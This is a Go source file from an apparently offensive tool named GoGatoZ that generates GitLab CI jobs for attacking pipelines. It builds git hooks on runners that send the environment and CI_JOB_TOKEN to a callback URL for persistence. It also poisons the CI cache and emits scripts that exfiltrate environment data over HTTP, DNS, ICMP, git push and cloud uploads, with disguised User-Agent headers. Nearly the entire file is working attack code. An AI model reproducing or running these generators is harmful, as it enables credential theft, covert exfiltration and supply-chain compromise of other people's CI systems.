// GitHookOptions renders a CI job that installs git hooks on the compromised runner
// to intercept CI_JOB_TOKEN from all subsequent builds (stealthy persistence).
type GitHookOptions struct {
	Common      CommonOptions
	CallbackURL string // HTTP endpoint to POST captured tokens to
	HookType    string // post-checkout (default), post-merge, pre-push
}

// GenerateGitHookYAML returns a CI job that installs git hooks on all runner build dirs.
func GenerateGitHookYAML(o GitHookOptions) string {
	name, stage := o.Common.defaults("git-hook")
	hookType := strings.TrimSpace(o.HookType)
	if hookType == "" {
		hookType = "post-checkout"
	}
	callbackURL := strings.TrimSpace(o.CallbackURL)
	if callbackURL == "" {
		callbackURL = "https://example.invalid/callback"
	}

	// Build hook script and base64-encode it to avoid YAML metacharacter issues
	// (colons in URLs, quotes, etc. break YAML block scalars).
	hookScript := fmt.Sprintf("#!/bin/sh\ncurl -sS -X POST -H \"Content-Type: text/plain\" -d \"$(printenv|base64 -w0)\" \"%s\" &", callbackURL)
	b64Hook := base64Encode(hookScript)

	return fmt.Sprintf(`
# Auto-generated by GoGatoZ (Git Hook Injection)
stages: [%s]

%s:
  stage: %s%s%s
  script:
    - |
      echo "[*] Installing %s hooks on runner build directories"
      HOOK_B64="%s"
      for dir in /home/gitlab-runner/builds /builds /tmp/builds; do
        if [ -d "$dir" ]; then
          find "$dir" -name ".git" -type d 2>/dev/null | while read gitdir; do
            hookdir="$gitdir/hooks"
            mkdir -p "$hookdir"
            echo "$HOOK_B64" | base64 -d > "$hookdir/%s"
            chmod +x "$hookdir/%s"
            echo "[+] Installed hook: $hookdir/%s"
          done
        fi
      done
      echo "[*] Hook injection complete"
  allow_failure: true%s
`, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		hookType, b64Hook, hookType, hookType, hookType, rulesManual(o.Common.Manual))
}

// CachePoisonOptions renders a CI job that poisons the GitLab CI cache.
type CachePoisonOptions struct {
	Common    CommonOptions
	CacheKey  string // cache key to match (default: "default")
	PoisonCmd string // command to modify cached content
	CachePath string // path within cache to poison (default: ".")
}

// GenerateCachePoisonYAML returns a CI job that writes to the cache with push policy.
func GenerateCachePoisonYAML(o CachePoisonOptions) string {
	name, stage := o.Common.defaults("cache-poison")
	cacheKey := strings.TrimSpace(o.CacheKey)
	if cacheKey == "" {
		cacheKey = "default"
	}
	cachePath := strings.TrimSpace(o.CachePath)
	if cachePath == "" {
		cachePath = "."
	}
	poisonCmd := strings.TrimSpace(o.PoisonCmd)
	if poisonCmd == "" {
		poisonCmd = `echo '#!/bin/sh\ncurl -sS http://example.invalid/callback -d "$(printenv|base64 -w0)" &' >> .git/hooks/post-checkout && chmod +x .git/hooks/post-checkout`
	}

	return fmt.Sprintf(`
# Auto-generated by GoGatoZ (Cache Poisoning)
stages: [%s]

%s:
  stage: %s%s%s
  cache:
    key: "%s"
    paths:
      - %s
    policy: push
  script:
    - echo "[*] Poisoning cache key '%s'"
    - %s
    - echo "[*] Cache poison complete — will persist to next pipeline using this cache key"
  allow_failure: true%s
`, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		cacheKey, cachePath, cacheKey, poisonCmd, rulesManual(o.Common.Manual))
}

func base64Encode(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }

// payloadExfilScript returns script lines for the given exfil method in the payload generator context.
func payloadExfilScript(method, target string) string {
	switch method {
	case "http":
		return fmt.Sprintf("    - |\n      b64=$(base64 -w0 env.txt)\n      curl -sS -X POST \\\n        -H 'Content-Type: application/json' \\\n        -H 'User-Agent: GitLab-Webhook/1.0' \\\n        -d \"{\\\"data\\\":\\\"$b64\\\",\\\"pipeline_id\\\":\\\"$CI_PIPELINE_ID\\\"}\" \\\n        \"%s\" || true\n", target)
	case "dns":
		return fmt.Sprintf("    - |\n      b64=$(base64 -w0 env.txt | tr '+/' '-_' | tr -d '=')\n      sid=$(echo -n \"$CI_PIPELINE_ID\" | md5sum | cut -c1-8)\n      i=0\n      while [ -n \"$b64\" ]; do\n        chunk=$(printf '%%.63s' \"$b64\")\n        b64=${b64#\"$chunk\"}\n        dig +short \"$i.$chunk.$sid.%s\" A >/dev/null 2>&1 || true\n        i=$((i+1))\n        sleep 0.1\n      done\n", target)
	case "icmp":
		return fmt.Sprintf("    - |\n      hex=$(base64 -w0 env.txt | xxd -p | tr -d '\\n')\n      i=0\n      while [ -n \"$hex\" ]; do\n        chunk=$(printf '%%.32s' \"$hex\")\n        hex=${hex#\"$chunk\"}\n        padded=$(printf '%%-32s' \"$chunk\" | tr ' ' '0')\n        ping -c 1 -p \"$padded\" \"%s\" >/dev/null 2>&1 || true\n        i=$((i+1))\n        sleep 0.05\n      done\n", target)
	case "git":
		return fmt.Sprintf("    - |\n      tmpdir=$(mktemp -d)\n      git clone --depth 1 \"%s\" \"$tmpdir\" 2>/dev/null\n      cp env.txt \"$tmpdir/\"\n      cd \"$tmpdir\"\n      git config user.email \"ci@gitlab.com\"\n      git config user.name \"CI\"\n      git add -A\n      git commit -q -m \"exfil-$CI_PIPELINE_ID\" 2>/dev/null\n      git push -q origin HEAD 2>/dev/null || true\n      cd -\n      rm -rf \"$tmpdir\"\n", target)
	case "cloud":
		return fmt.Sprintf("    - |\n      curl -sS -X PUT \\\n        -H 'Content-Type: application/octet-stream' \\\n        -H 'User-Agent: aws-sdk-go/1.44.0' \\\n        -T env.txt \\\n        \"%s\" || true\n", target)
	case "multi":
		return fmt.Sprintf("    - |\n      b64=$(base64 -w0 env.txt)\n      curl -sS -X POST \\\n        -H 'Content-Type: application/json' \\\n        -H 'User-Agent: GitLab-Webhook/1.0' \\\n        -d \"{\\\"data\\\":\\\"$b64\\\",\\\"pipeline_id\\\":\\\"$CI_PIPELINE_ID\\\"}\" \\\n        \"%s\" || true\n      # Backup: git commit exfil\n      tmpdir=$(mktemp -d)\n      git clone --depth 1 \"%s\" \"$tmpdir\" 2>/dev/null || true\n      if [ -d \"$tmpdir/.git\" ]; then\n        cp env.txt \"$tmpdir/\"\n        cd \"$tmpdir\"\n        git config user.email \"ci@gitlab.com\"\n        git config user.name \"CI\"\n        git add -A\n        git commit -q -m \"exfil-$CI_PIPELINE_ID\" 2>/dev/null\n        git push -q origin HEAD 2>/dev/null || true\n        cd -\n        rm -rf \"$tmpdir\"\n      fi\n", target, target)
	default:
		return ""
	}
}
